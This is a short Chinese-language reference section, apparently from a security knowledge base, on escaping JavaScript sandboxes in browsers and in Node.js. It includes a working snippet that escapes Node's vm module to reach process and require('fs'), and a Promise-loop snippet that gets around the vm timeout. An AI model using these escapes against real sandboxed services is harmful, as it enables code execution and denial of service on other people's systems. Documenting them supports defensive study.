沙箱逃逸
========================================

前端沙箱
----------------------------------------
在前端中，可能会使用删除 ``eval`` ，重写 ``Function.prototype.constructor`` / ``GeneratorFunction`` / ``AsyncFunction`` 等方式来完成前端的沙箱。在这种情况下，可以使用创建一个新iframe的方式来获取新的执行环境。

服务端沙箱
----------------------------------------
JavaScript提供了原生的vm模块，用于隔离了代码上下文环境。但是在该环境中依然可以访问标准的JavaScript API和全局的NodeJS环境。

在原生的沙箱模块中，常用的逃逸方式为：

.. code-block:: javascript

    const vm = require('vm');
    const sandbox = {};
    const whatIsThis = vm.runInNewContext(`
        const ForeignObject = this.constructor;
        const ForeignFunction = ForeignObject.constructor;
        const process = ForeignFunction("return process")();
        const require = process.mainModule.require;
        require("fs");
    `, sandbox);


考虑到JavaScript原生vm模块的缺陷，有开发者设计了vm2来提供一个更安全的隔离环境，但是在旧版本中同样存在一些逃逸方式，例如：

.. code-block:: javascript

    vm.runInNewContext(
      'Promise.resolve().then(()=>{while(1)console.log("foo", Date.now());}); while(1)console.log(Date.now())',
      {console:{log(){console.log.apply(console,arguments);}}},
      {timeout:5}
    );
